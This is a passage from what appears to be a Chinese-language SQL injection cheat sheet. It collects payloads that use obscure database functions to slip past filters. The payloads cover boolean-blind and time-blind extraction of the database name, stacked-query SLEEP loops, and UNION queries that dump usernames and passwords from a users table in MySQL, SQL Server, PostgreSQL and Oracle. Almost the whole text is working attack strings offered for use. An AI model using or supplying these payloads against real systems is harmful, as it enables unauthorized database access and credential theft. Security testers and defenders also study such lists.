' AND SIGN(ASCII(SUBSTR(database(),1,1))-100)=1 --  -- 大于
' AND SIGN(100-ASCII(SUBSTR(database(),1,1)))=1 --  -- 小于
' AND ABS(ASCII(SUBSTR(database(),1,1))-100)=0 --  -- 等于

-- 使用三角函数
' AND COS(0)=1 --  -- 总是成立
' AND SIN(0)=0 --
' AND TAN(0)=0 --
```

#### 2. 随机函数

```sql
-- 利用RAND函数
' AND RAND(ASCII(SUBSTR(database(),1,1)))=RAND(100) --
' AND RAND()*0=0 --  -- 总是成立
```

### 九、字符串处理生僻函数

#### 1.哈希函数

```sql
-- 哈希比较绕过
' AND MD5('admin')='21232f297a57a5a743894a0e4a801fc3' --
' AND SHA1('admin')='d033e22ae348aeb5660fc2140aec35850c4da997' --
' AND PASSWORD('admin')='*4ACFE3202A5FF5CF467898FC58AAB1D615029441' --

-- 哈希截取比较
' AND SUBSTRING(MD5('admin'),1,1)='2' --
```

#### 2. 编码函数


```sql
-- Base64编码
' AND TO_BASE64('admin')='YWRtaW4=' --
' AND FROM_BASE64('YWRtaW4=')='admin' --

-- 压缩函数
' AND COMPRESS('admin')=0x... --
' AND UNCOMPRESS(COMPRESS('admin'))='admin' --
```

### 十、日期时间函数

#### 1. 日期函数绕过


```sql
-- 使用日期比较
' AND NOW()=NOW() --  -- 总是成立
' AND CURDATE()=CURDATE() --
' AND CURTIME()=CURTIME() --

-- 日期运算
' AND DATE_ADD(NOW(),INTERVAL 1 DAY)>NOW() --
' AND DATE_SUB(NOW(),INTERVAL 1 DAY)<NOW() --
```

#### 2. 时间戳函数


```sql
-- UNIX时间戳
' AND UNIX_TIMESTAMP()>0 --
' AND FROM_UNIXTIME(UNIX_TIMESTAMP())=NOW() --
```

### 十一、流程控制生僻函数

#### 1. 不使用IF的流程控制

```sql
-- 使用WHILE模拟IF（需堆叠注入）
'; SET @i=0; WHILE @i<5 DO SELECT SLEEP(1); SET @i=@i+1; END WHILE; --

-- 使用REPEAT
'; SET @i=0; REPEAT SELECT SLEEP(1); SET @i=@i+1; UNTIL @i>=5 END REPEAT; --

-- 使用LOOP
'; SET @i=0; myloop: LOOP SELECT SLEEP(1); SET @i=@i+1; IF @i>=5 THEN LEAVE myloop; END IF; END LOOP; --
```

### 十二、组合生僻函数示例

#### 1. 联合查询绕过


```sql
-- 原始
' UNION SELECT version(),user(),database() --

-- 生僻组合
' UNION SELECT @@version,SUBSTRING_INDEX(USER(),'@',1),SCHEMA() --
' UNION SELECT @@GLOBAL.version,SESSION_USER(),DATABASE() --
' UNION SELECT VARIABLE_VALUE,1,2 FROM performance_schema.session_status 
   WHERE VARIABLE_NAME='UPTIME' --
```

#### 2. 布尔盲注绕过


```sql
-- 原始
' AND ASCII(SUBSTR(database(),1,1))>100 --

-- 生僻组合
' AND ORD(MID(database() FROM 1 FOR 1))>100 --
' AND POSITION(CHAR(100) IN database())<>1 --
' AND INSTR(database(),CHAR(100))<>1 --
' AND LOCATE(CHAR(100),database())<>1 --
```

#### 3. 时间盲注绕过


```sql
-- 原始
' AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(5),0) --

-- 生僻组合
' AND ELT((ASCII(SUBSTR(database(),1,1))>100)+1,SLEEP(5),0) --
' AND CASE WHEN ORD(MID(database(),1,1))>100 THEN BENCHMARK(1000000,MD5('test')) ELSE 0 END --
' AND IFNULL(NULLIF(ASCII(SUBSTR(database(),1,1))>100,0),SLEEP(5)) --
```

### 十三、各数据库特有生僻函数

#### 1. SQL Server生僻函数


```sql
-- 字符串函数
' UNION SELECT STRING_AGG(username,',') FROM users --
' UNION SELECT STRING_ESCAPE(username,'json') FROM users --
' UNION SELECT FORMAT(GETDATE(),'yyyy-MM-dd') --

-- 系统函数
' UNION SELECT SERVERPROPERTY('ProductVersion') --
' UNION SELECT HOST_NAME(),APP_NAME() --
```

#### 2. PostgreSQL生僻函数


```sql
-- 字符串函数
' UNION SELECT STRING_TO_ARRAY(username,',') FROM users --
' UNION SELECT ARRAY_TO_STRING(ARRAY[username,password],':') FROM users --

-- 系统函数
' UNION SELECT VERSION(),CURRENT_SETTING('server_version') --
```

#### 3. Oracle生僻函数


```sql
-- 字符串函数
' UNION SELECT LISTAGG(username,',') FROM users --
' UNION SELECT WM_CONCAT(username) FROM users --

-- 系统函数
' UNION SELECT BANNER FROM v$version WHERE ROWNUM=1 --
' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL --
```
